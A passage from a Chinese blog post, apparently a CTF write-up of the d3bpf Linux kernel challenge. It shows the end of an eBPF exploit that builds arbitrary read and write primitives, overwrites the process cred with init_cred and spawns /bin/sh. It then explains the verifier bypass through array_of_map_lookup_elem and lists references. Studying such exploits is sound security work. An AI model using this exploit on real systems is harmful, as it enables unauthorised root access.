BPF_STX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,<span class="number">0</span>),<span class="comment">//*(r0+0)=*(info_map_ptr + 0x110)=read_addr</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">        <span class="comment">//if r9 == 1 jmp hear  </span></span><br><span class="line">        <span class="comment">//arb_write  write to arb_read_write_map</span></span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, <span class="number">0</span>), <span class="comment">//  r7=*(r0+0)=*(info_map_ptr + 0x110)=write_val</span></span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, <span class="number">0</span>), <span class="comment">//*(r8+0)=*(arb_read_write_map_ptr+0x110)=*(write_addr)=write_val</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    setup_bpf_prog(arb_read_write, <span class="keyword">sizeof</span>(arb_read_write)/<span class="keyword">sizeof</span>(arb_read_write[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> current_task_struct = arb_read(arb_read(__per_cpu_offset) + current_task);</span><br><span class="line">    <span class="type">uint64_t</span> init_cred = kbase + INIT_CRED_OFFSET;</span><br><span class="line"></span><br><span class="line">    arb_write(current_task_struct + CRED_OFFSET, init_cred);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>比较重要的地方：</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221118205718895.png" alt="image-20221118205718895"></p>
<p>内核开启了jit，ebpf程序会被jitted，</p>
<p>当我们劫持了ops表时，覆盖MAP_LOOKUP时，它们调用的映射函数将直接转换为对这些函数的调用。这意味着 jitted 程序不会<code>ops</code>在运行时使用该值来找出正确的函数。函数的地址将嵌入代码中（根据<code>ops</code>at jit-time），然而<code>map_lookup_elem</code>是一种特殊情况，不是将函数的地址嵌入到代码中，<code>map_gen_lookup</code>而是使用函数名称生成等效的 eBPF 指令，这些指令将成为 eBPF 程序的一部分</p>
<blockquote>
<p>主要参考 <a target="_blank" rel="noopener" href="https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html">https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html</a></p>
</blockquote>
<p><strong>关于绕过verified ：</strong></p>
<p>map类型为BPF_MAP_TYPE_ARRAY_OF_MAPS 时，调用的lookup函数会有一次read_once 的解引用操作，真的神奇…… 一度让我调了很久，卡在这里不知道怎么任意写的，后面终于理解了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">array_of_map_lookup_elem</span><span class="params">(<span class="keyword">struct</span> bpf_map *<span class="built_in">map</span>, <span class="type">void</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> **<span class="title">inner_map</span> =</span> array_map_lookup_elem(<span class="built_in">map</span>, key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!inner_map)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> READ_ONCE(*inner_map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们劫持map_lookup_elem 为 array_of_map_lookup_elem，验证器会认为返回的是map_value的地址，而事实上返回的是map_value的值(而这是我们可控的)，当我们覆盖 map_value的值时，再去通过*(map_value_addr)去修改map_value，实际上修改的时map_value值所指向的内容，这就实现了任意写。而当我们通过*(map_value_addr)获取map_value时，实际上获取的是map_value的内容，这就实现了任意读，而map_value的值是由我们用户通过update直接写入的，验证器并不检查其值(？这里我不确定还)。</p>
<p><strong>关于提权</strong>：</p>
<p>此作者通过 __per_cpu_offset + current_task 获取当前进程的task_strcut,前提是这是单处理器，然后再覆盖本task的cred为init cred。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html">https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html</a></p>
<p><a target="_blank" rel="noopener" href="https://cjovi.icu/WP/1604.html">https://cjovi.icu/WP/1604.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dingmos.com/index.php/archives/16/">https://www.dingmos.com/index.php/archives/16/</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/630/1">https://forum.90sec.com/t/topic/630/1</a></p>
<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/bpf.2.html">https://man7.org/linux/man-pages/man2/bpf.2.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story">https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story</a></p>
<p><a target="_blank" rel="noopener" href="https://a1ex.online/2021/04/24/CVE-2017-16995-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://a1ex.online/2021/04/24/CVE-2017-16995-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>7r1p13J</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/kernel-CTF/"># kernel && CTF</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/11/22/CVE-2020-8835/">CVE-2020-8835 ebpf漏洞复现与分析</a>
            
            
            <a class="next" rel="next" href="/2022/11/19/Buddy%20System/">Buddy System源码阅读</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© 7r1p13J | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>